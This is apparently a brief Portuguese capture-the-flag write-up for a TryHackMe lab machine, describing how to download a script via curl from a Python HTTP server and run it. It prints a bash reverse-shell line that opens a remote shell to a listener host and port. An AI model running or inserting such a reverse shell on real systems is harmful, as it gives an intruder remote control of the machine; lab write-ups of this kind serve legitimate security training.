# 🛡️ Exploração da Máquina — 0ff3ns!v3 S3cur!ty - Sw4gg3r

## 🔗 Links

- 💻 **Máquina:** [Google Drive - Máquina](https://drive.google.com/file/d/1XsuWUulDDdktnV6fpPgRIH172iASvVmz/view)
- 🔍 **Prova:** [TryHackMe - 0ff3ns!v3 S3cur!ty - Sw4gg3r](https://tryhackme.com/room/0ff3nsv3s3curtysw4gg3r)

---

### Parece que a mquina tem um curl ,da pra subir um arquivo shell em servidor python com o script do shelRev baixar na maquina com o curl , executar e escutar a resposta do outro lado

![image](https://github.com/user-attachments/assets/9de29dba-6b94-4492-9d84-54b28b5408e3)
### dentro do arquivo shell_2.sh

```shell
  #!/bin/bash
  bash -i >& /dev/tcp/192.168.100.168/4444 0>&1

```

### Dentro dessa pasta vamos subir o servidor pyhton para baixar com o curl
![image](https://github.com/user-attachments/assets/ce117679-c08a-4e7b-90c8-79057e4d97db)

